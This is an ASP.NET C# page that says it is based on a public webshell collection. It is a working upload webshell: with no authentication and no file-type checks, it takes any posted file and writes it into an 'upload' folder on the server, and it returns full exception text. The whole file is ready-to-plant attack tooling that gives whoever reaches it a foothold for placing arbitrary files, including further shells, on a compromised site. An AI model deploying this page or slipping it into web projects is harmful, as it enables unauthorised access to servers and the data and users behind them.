<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!-- based on https://github.com/tennc/webshell -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    private const string HEADER = "<html>\n<head>\n</head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.Params["mode"] != null)
            {
                if (Request.Params["mode"] == "upload")
                {
                    Response.Write(HEADER);
                    Response.Write(this.UploadFile());
                    Response.Write(FOOTER);
                }
                else
                {
                    Response.Write(HEADER);
                    Response.Write("mode unknown");
                    Response.Write(FOOTER);
                }
            }
            else
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
            }
        }
        catch (Exception ex)
        {
            Response.Write(HEADER);
            Response.Write(ex.Message);
            Response.Write(FOOTER);
        }
    }
                

    private string UploadFile()
    {
        try
        {
            if (Request.Files.Count != 1)
            {
                return "Select a file";
            }
            HttpPostedFile httpPostedFile = Request.Files[0];
            int lenFile = httpPostedFile.ContentLength;
            byte[] buffer = new byte[lenFile];
            httpPostedFile.InputStream.Read(buffer, 0, lenFile);
            FileInfo fInfo = new FileInfo(Request.PhysicalPath);
            using (FileStream fileStream = new FileStream(Path.Combine(fInfo.DirectoryName,"upload", Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }
            return "Upload successful";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    private string GetUploadControls()
    {
        string temp = string.Empty;
        temp = "<form enctype=\"multipart/form-data\" action=\"?mode=upload\" method=\"post\">";
        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
        temp += "</form>";
        return temp;
    }

</script>